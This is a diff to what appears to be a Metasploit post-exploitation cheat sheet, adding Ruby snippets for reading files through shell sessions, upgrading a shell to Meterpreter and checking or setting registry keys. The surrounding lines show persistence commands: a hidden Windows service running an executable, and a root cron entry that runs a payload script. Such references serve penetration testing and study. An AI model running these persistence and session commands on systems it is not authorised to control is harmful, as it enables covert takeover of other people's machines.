@@ -156,6 +156,15 @@
       print_status("sc create #{sname} bin= \"C:\\Users\\Desktop\\fg.exe\"")
       proc = session.sys.process.execute("cmd.exe /c sc create #{sname} bin= \"C:\\Users\\Desktop\\fg.exe\"", nil, {'Hidden' => true})
 
+- **The shell.read() method provides the ability to read output from a shell session.**
+
+      session.shell_read("/etc/crontab")
+
+- **The session.shell_upgrade method will attempt to spawn a new Meterpreter session through an existing Shell session.**<br />
+'This requires that a multi/handler be running and that the host and port of this handler is provided to this method.'
+
+      session.shell_upgrade
+
 - **Executing a shell command (not meterpreter)**
 
       session.shell_command("echo \"* * * * * root /root/payload.sh\" >> /etc/crontab")
@@ -228,6 +237,10 @@
 
       user_name = client.fs.file.expand_path("%USERNAME%")
       print_good("target user name: #{user_name}")
+
+- **This method will list all active sessions in the framework instance.**
+
+      session.list
 
 - **Get current working directory**
 
@@ -796,6 +809,13 @@ system along with the details like IP, netmask, mac_address etc.
 
 ## MANIPULATE REGEDIT
 
+- **Checks if a key exists on the target registry**
+
+      base_key = "ScreenSaveActive"
+      root_key = "HKCU\\Software\\Microsoft\\title"
+      if registry_key_exist?(root_key, base_key)
+      print_good("ScreenSaveActive value found in regedit")
+
 - **Read remote registry key and store results in local var**
 
       data = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveActive')
@@ -819,6 +839,10 @@ system along with the details like IP, netmask, mac_address etc.
         data = "12.0"
       end
       print_good("Microsoft office version: #{data}")
+
+- **write reg key using meterpreter prompt**
+
+      reg setval -k "HKCU\\Control Panel\\Desktop" -v ScreenSaveActive -t REG_SZ -d 1
 
 - **write reg key remote using cmd_exec()**
 
